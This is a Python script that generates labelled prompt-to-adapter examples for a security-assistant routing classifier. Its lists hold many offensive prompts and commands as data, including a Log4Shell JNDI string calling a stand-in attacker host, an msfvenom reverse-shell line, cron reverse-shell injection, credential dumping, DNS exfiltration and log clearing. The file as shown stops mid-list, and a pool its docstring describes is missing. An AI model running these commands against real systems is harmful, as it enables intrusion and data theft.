#!/usr/bin/env python3
"""
Source 14: Router Classifier Training Data

Generates labelled (prompt → adapter) examples for training a learned routing
classifier to replace / back the regex-based AdapterRouter.

Three pools of examples:
  A) Extracted from processed/*.jsonl user turns — labelled by the ADAPTER each
     file was trained on. These are "clean" single-domain examples.
  B) Synthetic ambiguous cases — prompts that would confuse regex rules (e.g.
     SSRF on cloud metadata, AD pivoting from a web shell, etc.). Labelled
     manually with the correct adapter.
  C) Cross-domain prompts — real security scenarios that span two adapters;
     labelled with the adapter that should OWN the current step.

Output: raw/router_labels.jsonl  — one JSON per line: {prompt, adapter}

Usage:
  python3 src/source14_router.py          # generate to raw/router_labels.jsonl
  python3 src/source14_router.py --test   # print 5 samples per pool, no write
  python3 src/source14_router.py --stats  # count per adapter, no write
"""

import json
import random
import argparse
from pathlib import Path

# ── Config ────────────────────────────────────────────────────────────────────

PROCESSED_DIR = Path("processed")
OUTPUT_PATH   = Path("raw/router_labels.jsonl")

# How many user-turn prompts to sample per processed file (pool A)
POOL_A_PER_FILE = 150

# Explicit file→adapter mapping for files whose adapter isn't obvious from the name.
# For all other files in processed/, the adapter is inferred from the filename stem
# (e.g. webapp.jsonl → webapp, executor_correction.jsonl → executor).
# New adapters are picked up automatically as long as their processed files exist.
_EXPLICIT_FILE_TO_ADAPTER: dict[str, str] = {
    "htb_writeups.jsonl":     "htb",
}

# Known adapter names — used to validate auto-inferred labels.
# Extend this list when a new adapter is added; auto-discovery will handle the rest.
KNOWN_ADAPTERS: set[str] = {
    "htb", "vulhub", "attack", "exploitdb", "ad",
    "webapp", "osint", "cloud",
    "executor", "analyst", "planner", "researcher",
}


def _build_file_to_adapter(processed_dir: Path) -> dict[str, str]:
    """
    Build the file→adapter mapping dynamically from processed/*.jsonl.

    Rules (applied in order):
      1. Explicit override from _EXPLICIT_FILE_TO_ADAPTER
      2. Stem prefix matches a known adapter name
         (e.g. executor_correction → executor, analyst_h1 → analyst)
      3. Full stem matches a known adapter name exactly

    Unknown files (no matching adapter) are skipped with a warning, so new
    adapters are included automatically as soon as their processed JSONL exists.
    """
    mapping: dict[str, str] = {}
    for p in sorted(processed_dir.glob("*.jsonl")):
        fname = p.name
        stem  = p.stem   # filename without .jsonl

        # Rule 1: explicit override
        if fname in _EXPLICIT_FILE_TO_ADAPTER:
            mapping[fname] = _EXPLICIT_FILE_TO_ADAPTER[fname]
            continue

        # Rule 2 / 3: infer from stem
        matched: str | None = None
        # Exact match first
        if stem in KNOWN_ADAPTERS:
            matched = stem
        else:
            # Prefix match: "executor_correction" → "executor"
            for adapter in KNOWN_ADAPTERS:
                if stem.startswith(adapter):
                    matched = adapter
                    break

        if matched:
            mapping[fname] = matched
        else:
            print(f"  [skip] {fname} — no adapter match (add to KNOWN_ADAPTERS if new)")

    return mapping

# ── Pool B: synthetic ambiguous / hard cases ─────────────────────────────────
# These are cases where the regex router either ties or picks wrong.
# Format: (prompt_text, correct_adapter)
AMBIGUOUS_CASES: list[tuple[str, str]] = [
    # SSRF to cloud metadata — looks like webapp (SSRF) but the TARGET is cloud infra
    ("The target at 169.254.169.254 is returning AWS IAM credentials via SSRF. "
     "What can we do with these credentials?", "cloud"),
    ("SSRF confirmed on api.target.com — can read http://169.254.169.254/latest/meta-data/iam/. "
     "Retrieve the instance role credentials and enumerate S3 buckets.", "cloud"),
    ("Server-side request forgery on the image upload endpoint allows fetching "
     "http://metadata.google.internal/computeMetadata/v1/. Exploit this for GCP privilege escalation.", "cloud"),
    # AD from a web shell — the entry was webapp but the GOAL is AD
    ("We have RCE via a PHP webshell on the IIS server. The box is domain-joined. "
     "Run SharpHound to enumerate the Active Directory environment.", "ad"),
    ("Got a meterpreter shell on a Windows host. The host has impacket installed. "
     "Use secretsdump to dump NTLM hashes from the domain controller.", "ad"),
    # CVE in a cloud service — CVE pattern → vulhub, but context is cloud
    ("CVE-2019-0708 (BlueKeep) is patched. The EC2 instance has IMDSv1 enabled. "
     "Use the metadata service to get the IAM role and escalate to admin.", "cloud"),
    ("CVE-2021-44228 (Log4Shell) was confirmed on the application. "
     "The server runs on AWS Lambda. Chain the RCE to exfiltrate the Lambda execution role.", "cloud"),
    # Timing oracle — researcher, not webapp
    ("The /api/login endpoint returns 200ms for valid usernames and 50ms for invalid ones. "
     "Standard tools found nothing. What does this timing difference suggest?", "researcher"),
    ("I notice that GET /api/export?format=pdf takes 3x longer than format=csv. "
     "The error on format=x leaks: template: pdf.tmpl:14. sqlmap and nikto found nothing.", "researcher"),
    # Prototype pollution — researcher, not webapp
    ("POST /api/settings with {\"__proto__\":{\"isAdmin\":true}} returns 200 without error. "
     "Standard scanners missed this. How do we confirm and exploit prototype pollution?", "researcher"),
    # HTB post-shell with AD — htb owns the chain, not ad
    ("We have a low-priv shell on Cascade (Windows HTB box). "
     "linpeas found AD CS misconfiguration. What's the privesc path?", "htb"),
    ("Foothold on Forest HTB box via AS-REP roasting. We have a shell as svc-alfresco. "
     "Enumerate WriteDACL rights for privilege escalation.", "htb"),
    # OSINT that pivots to cloud
    ("Subdomain enumeration found dev.target-corp.com pointing to an S3 bucket. "
     "The bucket returns a 403. Check for subdomain takeover.", "osint"),
    ("Google dorking found an exposed .git directory. Inside is an AWS access key. "
     "What's the recon methodology to assess blast radius?", "osint"),
    # Webapp IDOR that needs analyst interpretation
    ("GET /api/users/1337 returns another user's full profile including email and phone. "
     "sqlmap shows no SQLi. Classify this finding and assess impact.", "analyst"),
    ("The response to POST /api/order/submit contains other users' order IDs in the "
     "JSON payload. This looks like an IDOR. Write the H1 report summary.", "analyst"),
    # Executor role — fixing a broken command
    ("subfinder -x -d target.com returned: Error: unknown flag '-x'. Fix this command.", "executor"),
    ("nmap --sV -p- target.com returned: nmap: unrecognized option '--sV'. "
     "The correct flag is -sV. What is the corrected command?", "executor"),
    # Planner role — decomposing goals
    ("We are in the recon phase of a bug bounty against api.target.com. "
     "Create a step-by-step attack plan for testing the OAuth2 implementation.", "planner"),
    ("We just found that the /api/v1/admin endpoint returns 401 instead of 403. "
     "Our original plan assumed no admin panel. Revise the plan.", "planner"),
    # Researcher cross-domain (CTF-style)
    ("CTF challenge: JWT with kid header. jwt_tool --crack found nothing. "
     "Requesting /api/keys?kid=../../../../etc/passwd returns 'invalid PEM'. "
     "What does this suggest?", "researcher"),
    # Cloud misconfig that looks like osint
    ("S3 bucket target-prod is publicly listable via aws s3 ls. "
     "It contains database backups. What's the exploitation path?", "cloud"),
    ("The Azure storage account has anonymous blob access enabled. "
     "amass found the endpoint via certificate transparency. Exploit the misconfiguration.", "cloud"),
    # Generic AD that looks like attack
    ("T1558.003 Kerberoasting: extract service tickets for SPN accounts and crack offline. "
     "Use Rubeus to perform the attack.", "ad"),
    ("Lateral movement via pass-the-hash to the domain controller using crackmapexec.", "ad"),
    # WebApp with JWT that's not AD
    ("The JWT uses alg:none. Modify the token to set isAdmin=true and access /api/admin.", "webapp"),
    ("CORS misconfiguration on api.target.com allows credentials from null origin. "
     "Craft a PoC to steal the victim's session token.", "webapp"),
    # Attack (ATT&CK) vs HTB
    ("T1003 OS Credential Dumping via lsass.exe process memory. "
     "Use mimikatz sekurlsa::logonpasswords.", "attack"),
    ("Persistence via T1053.005 Scheduled Task. Create a task that calls back to C2 "
     "every 5 minutes using schtasks.", "attack"),
    # ExploitDB — explicit exploit creation
    ("Write a Python exploit for CVE-2023-46604 (Apache ActiveMQ RCE). "
     "The target is running ActiveMQ 5.15.3.", "exploitdb"),
    ("Generate a shellcode payload for a buffer overflow in a 32-bit Linux binary. "
     "Use msfvenom with x86/shikata_ga_nai encoder.", "exploitdb"),
    # More researcher edge cases
    ("Race condition: 15 simultaneous POST /api/transfer requests all passed the balance "
     "check before any deduction committed. The flag endpoint checks total_transferred >= 1000.", "researcher"),
    ("HTTP request smuggling via CL.TE desync. HAProxy uses Content-Length, Nginx uses "
     "Transfer-Encoding. Standard smuggler.py didn't detect it.", "researcher"),
    # Vulhub CVE exploitation
    ("CVE-2017-5638 Apache Struts OGNL injection. The target runs Struts 2.3.5. "
     "Generate the exploit payload.", "vulhub"),
    ("CVE-2021-3129 Laravel debug mode RCE. The /ignition/execute-solution endpoint "
     "is accessible. Exploit it.", "vulhub"),
]

# ── Pool D: natural-language anchor prompts — short, varied, per-adapter ─────
# These simulate the kinds of natural queries that come in during a real
# engagement. Pool A is too structured (LLM chat format); Pool D gives the
# MiniLM encoder clear short-form domain signals for each adapter.
# Aim: ~40+ prompts per adapter, diverse phrasing, realistic commands/tools.
NATURAL_ANCHORS: list[tuple[str, str]] = [

    # ── osint ──────────────────────────────────────────────────────────────────
    ("Use subfinder to enumerate subdomains of target.com",                             "osint"),
    ("Run subfinder -d target.com -all -silent and save results",                       "osint"),
    ("Find all subdomains of target.com using amass enum",                              "osint"),
    ("amass enum -passive -d target.com -o amass_out.txt",                              "osint"),
    ("Use assetfinder to discover subdomains then probe with httpx",                    "osint"),
    ("Probe live subdomains using httpx -l subs.txt -title -status-code",               "osint"),
    ("Run dnsx to resolve subdomains and find A records",                               "osint"),
    ("Google dork for exposed admin panels on target.com",                              "osint"),
    ("Use theHarvester to gather emails and hostnames for target.com",                  "osint"),
    ("Search Shodan for all IPs belonging to the target organisation",                  "osint"),
    ("Check certificate transparency logs on crt.sh for *.target.com",                 "osint"),
    ("Run trufflehog on target's GitHub organisation to find leaked secrets",           "osint"),
    ("Use whois and dig to map the DNS infrastructure of target.com",                   "osint"),
    ("Check if any subdomains are pointing to decommissioned cloud services",           "osint"),
    ("Run katana to crawl all discovered subdomains and enumerate endpoints",           "osint"),
    ("Use gau to pull all historical URLs for target.com from Wayback Machine",         "osint"),
    ("waybackurls target.com | grep -i api | sort -u",                                  "osint"),
    ("Run passive recon to identify cloud infrastructure and CDN providers",            "osint"),
    ("Enumerate JavaScript files for API endpoints using katana -jc",                   "osint"),
    ("Find open S3 buckets associated with the target via bucket name bruteforce",      "osint"),
    ("Run subfinder followed by httpx to build a live host list for bug bounty",        "osint"),
    ("Use dnsrecon to enumerate DNS records including MX, TXT, and NS",                 "osint"),
    ("Check DMARC, SPF, and DKIM records for email spoofing potential",                 "osint"),
    ("Search for exposed .git directories and sensitive files via dorking",             "osint"),
    ("Enumerate all API endpoints visible in JavaScript bundles",                       "osint"),
    ("Use censys to find all certificates and IPs for the target ASN",                  "osint"),
    ("Run nslookup and dig to identify internal hostnames leaking via DNS",             "osint"),
    ("Perform subdomain takeover check on all CNAME records",                           "osint"),
    ("Map all cloud service fingerprints for the discovered subdomains",               "osint"),
    ("Use wafw00f to detect WAF technology on all live subdomains",                     "osint"),
    ("Find GitHub repos belonging to the company and search for API keys",              "osint"),
    ("Use gitleaks to scan all company GitHub repositories for secrets",                "osint"),
    ("Collect all URLs from gau and waybackurls, deduplicate and filter for params",   "osint"),
    ("Identify the tech stack of each live subdomain using whatweb",                    "osint"),
    ("Run amass intel to find ASN numbers and CIDR ranges for the organisation",        "osint"),
    ("Check for open redirects and parameter pollution in discovered URLs",             "osint"),
    ("Run httpx on subdomain list to fingerprint status codes and technologies",        "osint"),
    ("Discover new attack surface by enumerating all TLS certificate SANs",            "osint"),

    # ── webapp ─────────────────────────────────────────────────────────────────
    ("Test the login endpoint for SQL injection using sqlmap",                          "webapp"),
    ("sqlmap -u 'https://target.com/api/users?id=1' --dbs --batch",                    "webapp"),
    ("Test for reflected XSS in the search parameter with a <script>alert(1)</script> payload", "webapp"),
    ("Check for IDOR by incrementing the order ID in the API response",                "webapp"),
    ("The /api/v1/user/profile endpoint returns data for any user ID. Test IDOR.",     "webapp"),
    ("Test for SSRF via the import URL feature using a Burp Collaborator URL",         "webapp"),
    ("Check for SSTI in the template name parameter using {{7*7}} probe",              "webapp"),
    ("Test JWT token with algorithm confusion — change RS256 to HS256",                "webapp"),
    ("Fuzz the /api/v2/ directory with ffuf to find undocumented endpoints",           "webapp"),
    ("ffuf -u https://target.com/api/FUZZ -w wordlist.txt -mc 200,301,401",            "webapp"),
    ("Test for HTTP request smuggling on the load balancer using smuggler.py",         "webapp"),
    ("Check for XXE vulnerability in the XML import feature",                          "webapp"),
    ("Test the file upload endpoint for extension bypass to upload a webshell",        "webapp"),
    ("The GraphQL API allows introspection. Map all queries and mutations.",            "webapp"),
    ("Test for broken object level authorisation on all API endpoints",                "webapp"),
    ("Check if the logout endpoint properly invalidates the session token",            "webapp"),
    ("Use Burp Suite to test the OAuth2 flow for token theft vulnerabilities",         "webapp"),
    ("Test for open redirect in the returnUrl parameter via crafted URL",              "webapp"),
    ("Run nikto against the web server to find known misconfigurations",               "webapp"),
    ("Check CORS policy — does it reflect arbitrary origins with credentials?",        "webapp"),
    ("Test the password reset flow for token reuse and no expiry",                     "webapp"),
    ("Check for insecure deserialization in the session cookie",                       "webapp"),
    ("Fuzz all API parameters for mass assignment vulnerabilities",                    "webapp"),
    ("Test the /api/admin endpoints with the low-privilege user token",                "webapp"),
    ("Enumerate all hidden parameters using Arjun on the search endpoint",             "webapp"),
    ("Test for cache poisoning via X-Forwarded-Host header injection",                 "webapp"),
    ("dalfox url 'https://target.com/search?q=1' to find XSS sinks",                  "webapp"),
    ("Fuzz the v2 API with intruder to find privilege escalation paths",               "webapp"),
    ("Check if the GraphQL endpoint allows batch queries for rate limit bypass",       "webapp"),
    ("Test the websocket endpoint for lack of origin validation",                      "webapp"),
    ("Run feroxbuster to enumerate all directories on the web server",                 "webapp"),
    ("Test for path traversal in the file download endpoint",                          "webapp"),
    ("Check if the API leaks internal IPs or hostnames in error responses",            "webapp"),
    ("Test for business logic flaws in the coupon/discount endpoint",                  "webapp"),
    ("Verify if the API enforces rate limiting on the password reset endpoint",        "webapp"),
    ("Use wfuzz to fuzz hidden parameters on the register endpoint",                   "webapp"),
    ("Test for stored XSS in the user bio field",                                      "webapp"),
    ("Check if session tokens are predictable or use a weak PRNG",                     "webapp"),
    ("Test the checkout flow for race condition allowing negative balance",             "webapp"),
    ("Test for Host header injection in the password reset email link",                "webapp"),

    # ── vulhub ─────────────────────────────────────────────────────────────────
    ("CVE-2021-44228 Log4Shell — craft a JNDI payload for the User-Agent header",      "vulhub"),
    ("CVE-2017-5638 Apache Struts OGNL injection on Struts 2.3.5",                     "vulhub"),
    ("CVE-2021-3129 Laravel debug mode — exploit /ignition/execute-solution",          "vulhub"),
    ("CVE-2022-0847 Dirty Pipe Linux kernel privilege escalation",                     "vulhub"),
    ("CVE-2019-11510 Pulse Secure VPN pre-auth file read vulnerability",               "vulhub"),
    ("CVE-2020-5902 F5 BIG-IP iControl REST unauthenticated RCE",                     "vulhub"),
    ("CVE-2021-21985 VMware vCenter Server RCE via vSphere Client plugin",             "vulhub"),
    ("CVE-2022-1388 F5 BIG-IP iControl REST authentication bypass",                   "vulhub"),
    ("Exploit CVE-2019-0708 BlueKeep RDP vulnerability on Windows 2008 R2",           "vulhub"),
    ("CVE-2023-46604 Apache ActiveMQ OpenWire RCE — class loader exploit",             "vulhub"),
    ("CVE-2021-26855 Microsoft Exchange Server SSRF (ProxyLogon)",                    "vulhub"),
    ("Exploit CVE-2021-22986 F5 iControl REST unauthenticated RCE",                   "vulhub"),
    ("CVE-2019-19781 Citrix ADC path traversal and code execution",                   "vulhub"),
    ("CVE-2020-1472 Zerologon — unauthenticated domain controller compromise",        "vulhub"),
    ("Log4Shell JNDI exploit on Apache Solr — test ${jndi:ldap://attacker/a}",         "vulhub"),
    ("CVE-2021-41773 Apache HTTP Server path traversal on 2.4.49",                    "vulhub"),
    ("Exploit Spring4Shell CVE-2022-22965 on Spring Framework 5.3.17",                "vulhub"),
    ("CVE-2021-40438 Apache httpd mod_proxy SSRF",                                     "vulhub"),
    ("CVE-2022-26134 Confluence OGNL injection RCE",                                   "vulhub"),
    ("CVE-2021-20021 SonicWall SSL-VPN unauthenticated user creation",                 "vulhub"),
    ("Exploit CVE-2021-44532 Node.js certificate validation bypass",                  "vulhub"),
    ("CVE-2023-34362 MOVEit Transfer SQLi and RCE",                                    "vulhub"),
    ("Test CVE-2018-13379 Fortinet SSL-VPN path traversal for credentials",           "vulhub"),
    ("CVE-2020-14882 Oracle WebLogic Console authentication bypass RCE",              "vulhub"),
    ("Exploit CVE-2022-30190 Microsoft Follina MSDT RCE via crafted Word doc",        "vulhub"),
    ("CVE-2021-34527 PrintNightmare — Windows Print Spooler privilege escalation",    "vulhub"),
    ("Craft nuclei template to detect CVE-2021-44228 on all discovered subdomains",  "vulhub"),
    ("CVE-2021-22205 GitLab unauthenticated RCE via image upload",                    "vulhub"),
    ("Exploit CVE-2023-23397 Outlook zero-click NTLM hash capture",                   "vulhub"),
    ("CVE-2022-41082 Microsoft Exchange ProxyNotShell RCE",                            "vulhub"),
    ("Test for CVE-2023-27350 PaperCut NG unauthenticated RCE",                       "vulhub"),
    ("CVE-2021-27065 Exchange OWA SSRF chained with CVE-2021-26855",                  "vulhub"),
    ("Exploit CVE-2024-3400 PAN-OS command injection in GlobalProtect",               "vulhub"),
    ("CVE-2023-4966 Citrix Bleed session token leak",                                  "vulhub"),
    ("Use nuclei to scan for all known CVEs on the target web server",                 "vulhub"),
    ("CVE-2021-21972 VMware vCenter Server file upload RCE",                           "vulhub"),
    ("Exploit CVE-2021-22893 Pulse Secure pre-auth RCE",                               "vulhub"),
    ("CVE-2020-3452 Cisco ASA path traversal in WebVPN",                               "vulhub"),
    ("CVE-2019-18935 Telerik UI deserialization RCE",                                  "vulhub"),
    ("Test the target for EternalBlue SMBv1 exploit CVE-2017-0144",                   "vulhub"),

    # ── htb ────────────────────────────────────────────────────────────────────
    ("nmap -sV -p- 10.10.10.5 to enumerate all services",                              "htb"),
    ("nmap -sC -sV -p 80,443,8080 -oN initial.txt 10.10.10.100",                      "htb"),
    ("We have a shell on the HTB machine. Run linpeas to find privesc paths",          "htb"),
    ("sudo -l shows we can run /usr/bin/python3 as root. Escalate privileges.",        "htb"),
    ("SUID binary found at /usr/local/bin/backup. Analyse for privilege escalation.",  "htb"),
    ("The web server at port 80 returns a custom 404 page. Enumerate directories.",    "htb"),
    ("Found a Tomcat manager at /manager/html. Try default credentials.",              "htb"),
    ("SSH as user www-data. Enumerate /home directories and .bash_history",            "htb"),
    ("Found id_rsa key in /home/user/.ssh. Use it to SSH as root.",                    "htb"),
    ("Run pspy to monitor processes and find cron jobs running as root",               "htb"),
    ("Port 111 rpcbind is open. Run rpcinfo to enumerate NFS shares.",                 "htb"),
    ("The SMB share //10.10.10.5/share has anonymous read access. Enumerate it.",     "htb"),
    ("PHP file inclusion vulnerability found. Read /etc/passwd via LFI.",             "htb"),
    ("Gobuster dir on port 80 shows /secret directory with a flag.txt",               "htb"),
    ("User has write access to /etc/cron.d. Add a cronjob for reverse shell.",        "htb"),
    ("Writable /etc/passwd file found. Add a root user.",                              "htb"),
    ("Binary has SUID set and calls system() with a relative path. PATH hijack.",     "htb"),
    ("Rustscan found ports 21 22 80 3306. Try FTP anonymous login first.",            "htb"),
    ("WordPress site on port 80. Run wpscan to enumerate plugins and users.",         "htb"),
    ("Found /backup/config.php in the web root with database credentials.",           "htb"),
    ("SSH port knocking sequence found in source code. Execute and then SSH.",        "htb"),
    ("The HTB machine runs Windows. Use evil-winrm to get a shell as user.",          "htb"),
    ("WinPEAS output shows AlwaysInstallElevated is enabled. Exploit it.",            "htb"),
    ("Unquoted service path found for SVC_NAME. Generate and place malicious binary.", "htb"),
    ("SeImpersonatePrivilege is enabled. Use PrintSpoofer or JuicyPotato.",           "htb"),
    ("Found cleartext password in registry: HKLM\\SOFTWARE\\App\\config",            "htb"),
    ("The machine runs an old Samba version. Check for trans2open buffer overflow.",  "htb"),
    ("Port 6379 Redis is open with no auth. Write SSH key via Redis.",                "htb"),
    ("Python script runs as root via cron. Inject reverse shell into it.",            "htb"),
    ("Kernel version 3.13.0-24 is vulnerable to overlayfs privesc. Exploit it.",     "htb"),
    ("Found .htpasswd file. Crack the hash with john and gain HTTP auth.",            "htb"),
    ("Enumerate open shares with smbclient -L //10.10.10.5 -N",                       "htb"),
    ("Use masscan to quickly scan all 65535 ports on the target IP",                  "htb"),
    ("metasploit module exploit/multi/handler to catch reverse shell",                "htb"),
    ("netstat -an shows internal service on 127.0.0.1:8500. Port forward and access.", "htb"),

    # ── exploitdb ──────────────────────────────────────────────────────────────
    ("Write a Python exploit for the buffer overflow in the custom FTP service",       "exploitdb"),
    ("Generate a shellcode payload for x86 Linux using msfvenom",                     "exploitdb"),
    ("Craft a stack-based buffer overflow exploit with ret2libc technique",            "exploitdb"),
    ("Write an exploit for a format string vulnerability in the binary",               "exploitdb"),
    ("Use msfvenom to create a Windows reverse shell executable",                      "exploitdb"),
    ("Develop a PoC for the heap overflow in the web server binary",                   "exploitdb"),
    ("Create a ROP chain to bypass NX and ASLR in the 64-bit binary",                 "exploitdb"),
    ("Write a Python exploit script using pwntools for the pwn challenge",             "exploitdb"),
    ("msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f elf",   "exploitdb"),
    ("Generate a custom shellcode for the exploit using pwntools shellcraft",         "exploitdb"),
    ("Write an exploit for CVE-2022-0847 Dirty Pipe to overwrite /etc/passwd",        "exploitdb"),
    ("Create a Metasploit module for the discovered RCE vulnerability",               "exploitdb"),
    ("Use searchsploit to find exploits for Apache 2.4.49",                            "exploitdb"),
    ("Develop a blind RCE exploit using time-based command injection",                 "exploitdb"),
    ("Write a custom exploit for the deserialization vulnerability in Java app",       "exploitdb"),
    ("Craft a payload for PHP object injection using POP chain",                       "exploitdb"),
    ("Generate a macro-based payload for Office document exploitation",               "exploitdb"),
    ("Write a Python script to exploit the path traversal for RCE",                   "exploitdb"),
    ("Create a PoC exploit for the SQL injection to achieve RCE via INTO OUTFILE",    "exploitdb"),
    ("Use pwndbg to analyse the crash and determine the offset for EIP control",      "exploitdb"),
    ("Craft a malicious serialized Java object to trigger RCE",                        "exploitdb"),
    ("Write a node.js prototype pollution exploit that escalates to RCE",              "exploitdb"),
    ("Generate a shellcode payload for ARM64 Linux",                                   "exploitdb"),
    ("Use msfconsole to run the exploit/windows/smb/ms17_010_eternalblue module",     "exploitdb"),
    ("Create a Python2 exploit for the blind SQL injection authentication bypass",    "exploitdb"),
    ("Build a PoC that chains CVE-2021-26855 SSRF with CVE-2021-27065 for RCE",      "exploitdb"),
    ("Develop an exploit for the race condition TOCTOU vulnerability in the daemon",  "exploitdb"),
    ("msfvenom -p windows/x64/meterpreter/reverse_https to create a stager",         "exploitdb"),
    ("Write a JNDI exploit payload delivery server for Log4Shell",                    "exploitdb"),
    ("Craft a malicious OGNL expression for the Apache Struts RCE",                   "exploitdb"),

    # ── attack ─────────────────────────────────────────────────────────────────
    ("Implement T1003.001 LSASS memory dump using mimikatz sekurlsa::logonpasswords", "attack"),
    ("T1055 Process Injection — inject shellcode into a running process using VirtualAlloc", "attack"),
    ("Establish persistence via T1053.005 scheduled task calling back to C2",         "attack"),
    ("T1059.001 PowerShell execution with AMSI bypass for payload delivery",          "attack"),
    ("Implement T1021.002 SMB lateral movement using PsExec to CORP-DC01",            "attack"),
    ("T1486 data encryption for ransom — demonstrate encryption of user files",       "attack"),
    ("Exfiltrate collected credentials via T1041 exfiltration over C2 channel",       "attack"),
    ("T1071.001 use HTTP/S C2 beacons to blend with normal web traffic",              "attack"),
    ("T1562.001 disable Windows Defender using Set-MpPreference",                     "attack"),
    ("Use T1078 valid accounts — harvest and reuse domain credentials",               "attack"),
    ("T1136.001 create a local backdoor account for persistence",                     "attack"),
    ("Cobalt Strike beacon — establish persistence via T1543.003 Windows service",    "attack"),
    ("T1110.003 password spraying attack against O365 using MSOLSpray",               "attack"),
    ("Implement T1016 system network configuration discovery",                         "attack"),
    ("T1018 remote system discovery — enumerate all hosts in the domain",             "attack"),
    ("Use Mimikatz to dump NTLM hashes via T1003.002 Security Account Manager",      "attack"),
    ("T1048.003 exfiltrate data over DNS via dnscat2 tunnel",                         "attack"),
    ("T1574.001 DLL hijacking for persistence and privilege escalation",              "attack"),
    ("T1095 non-application layer protocol — use raw TCP for C2 communication",      "attack"),
    ("Implement T1070.001 clear Windows event logs to cover tracks",                  "attack"),
    ("T1027 obfuscated files — base64-encode and XOR-encrypt the payload",           "attack"),
    ("T1190 exploit public-facing application — Apache Struts RCE for initial access", "attack"),
    ("Use T1112 modify registry for persistence via Run key",                          "attack"),
    ("T1567.002 exfiltrate data to GitHub using a private repository",               "attack"),
    ("T1055.012 process hollowing to disguise malicious code as svchost.exe",        "attack"),
    ("Implement T1499 endpoint denial of service for distraction during exfil",      "attack"),
    ("T1569.002 system services — create and start a malicious Windows service",     "attack"),
    ("Use Sliver C2 framework for T1071 command and control",                         "attack"),
    ("T1546.015 Component Object Model hijacking for persistence",                    "attack"),
    ("T1134.001 token impersonation using SeImpersonatePrivilege",                    "attack"),
    ("Implement collection via T1005 data from local system",                         "attack"),
    ("T1057 process discovery — enumerate running processes for defence evasion",    "attack"),
    ("Use Responder for T1557.001 LLMNR/NBT-NS poisoning to capture NTLMv2 hashes", "attack"),

    # ── ad ─────────────────────────────────────────────────────────────────────
    ("Run BloodHound and SharpHound to map Active Directory attack paths",            "ad"),
    ("bloodhound-python -d corp.local -u user -p pass -c All",                        "ad"),
    ("Perform Kerberoasting to extract service ticket hashes with Rubeus",            "ad"),
    ("Rubeus.exe kerberoast /nowrap /format:hashcat to extract TGS tickets",          "ad"),
    ("Run AS-REP roasting against accounts with pre-authentication disabled",        "ad"),
    ("impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt",                 "ad"),
    ("Use secretsdump to dump NTLM hashes from the domain controller",               "ad"),
    ("impacket-secretsdump corp.local/Administrator@10.10.10.5 -hashes :aad...",      "ad"),
    ("Exploit DCSync rights to replicate all domain password hashes",                 "ad"),
    ("Pass-the-hash attack to authenticate to SMB using NTLM hash",                   "ad"),
    ("Golden ticket attack — forge a TGT using the KRBTGT hash",                     "ad"),
    ("Silver ticket — forge a service ticket for CIFS using the computer account hash", "ad"),
    ("Exploit GenericWrite ACL to perform targeted Kerberoasting",                    "ad"),
    ("Abuse WriteDACL on a group to add a user and escalate privileges",              "ad"),
    ("ADCS ESC1 exploit — request certificate for another user via certipy",         "ad"),
    ("certipy find -u user@corp.local -p pass -dc-ip 10.10.10.5 to find ADCS vulns", "ad"),
    ("Constrained delegation abuse — use Rubeus to request S4U2Self/S4U2Proxy",      "ad"),
    ("Unconstrained delegation — extract TGT from LSASS of delegated machine",      "ad"),
    ("GPO abuse — modify a GPO to execute a reverse shell as domain admin",           "ad"),
    ("Use crackmapexec to spray credentials across all domain machines",              "ad"),
    ("crackmapexec smb 10.10.10.0/24 -u admin -p Password123 --shares",              "ad"),
    ("Evil-WinRM to get a remote shell as domain admin",                              "ad"),
    ("RBCD attack — configure msDS-AllowedToActOnBehalfOfOtherIdentity",             "ad"),
    ("Use impacket-psexec for remote code execution as domain admin",                "ad"),
    ("Enumerate all domain users with net user /domain and PowerView",               "ad"),
    ("PowerView Get-DomainUser -Properties samaccountname,admincount",               "ad"),
    ("Find all users with adminCount=1 — likely privileged accounts",                "ad"),
    ("Check for password in Active Directory user description fields",                "ad"),
    ("Enumerate domain trusts with nltest /domain_trusts",                            "ad"),
    ("Abuse PrinterBug to force authentication from DC to attacker machine",         "ad"),
    ("Use mimikatz lsadump::dcsync /user:Administrator for hash extraction",         "ad"),
    ("Identify ESC8 — ADCS web enrollment with NTLM relay opportunity",              "ad"),
    ("Enumerate all SPNs in the domain with setspn -T corp.local -Q */*",            "ad"),
    ("Identify accounts with Kerberos pre-auth disabled for AS-REP roasting",       "ad"),

    # ── cloud ──────────────────────────────────────────────────────────────────
    ("Access the EC2 metadata service to retrieve IAM credentials",                   "cloud"),
    ("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",        "cloud"),
    ("Enumerate S3 buckets accessible with the retrieved IAM credentials",            "cloud"),
    ("aws s3 ls --profile compromised to list all accessible S3 buckets",             "cloud"),
    ("Check IAM role permissions using aws iam get-policy and aws iam list-roles",    "cloud"),
    ("Use pacu to run automated AWS privilege escalation modules",                     "cloud"),
    ("Enumerate all Lambda functions and their execution roles",                       "cloud"),
    ("aws lambda list-functions and check each function's environment variables",     "cloud"),
    ("Use ScoutSuite to audit AWS security configuration",                             "cloud"),
    ("Check for exposed RDS databases and security group misconfigurations",           "cloud"),
    ("Enumerate Azure AD users and groups using az cli",                              "cloud"),
    ("az account list && az role assignment list to check Azure permissions",         "cloud"),
    ("Check for Azure storage accounts with public blob access",                      "cloud"),
    ("Use Prowler to audit the AWS account for CIS benchmark compliance",             "cloud"),
    ("Enumerate GCP IAM bindings using gcloud projects get-iam-policy",              "cloud"),
    ("Check for exposed Kubernetes dashboard and API server",                         "cloud"),
    ("Access GCP metadata at http://metadata.google.internal/computeMetadata/v1/",   "cloud"),
    ("Exploit over-permissive IAM role to create new admin user in AWS",              "cloud"),
    ("Check for public ECR images containing hardcoded credentials",                  "cloud"),
    ("Use CloudGoat scenario to practice AWS privilege escalation",                   "cloud"),
    ("Enumerate all EC2 instances and their security groups for SSH exposure",        "cloud"),
    ("AWS STS assume-role to pivot from compromised Lambda to admin role",            "cloud"),
    ("Check for exposed Elasticsearch clusters in AWS with public IP bindings",       "cloud"),
    ("Use cloudmapper to visualise the AWS network topology",                          "cloud"),
    ("Detect and exploit IMDSv1 to retrieve instance metadata",                        "cloud"),
    ("Check Route53 hosted zones for dangling DNS records",                            "cloud"),
    ("Enumerate all API Gateway endpoints and test for auth bypass",                  "cloud"),
    ("Check for public RDS snapshots that can be shared and mounted",                 "cloud"),
    ("Use Boto3 to enumerate all IAM users, roles, and policies",                     "cloud"),
    ("Check for overly permissive S3 bucket policies that allow public PutObject",   "cloud"),
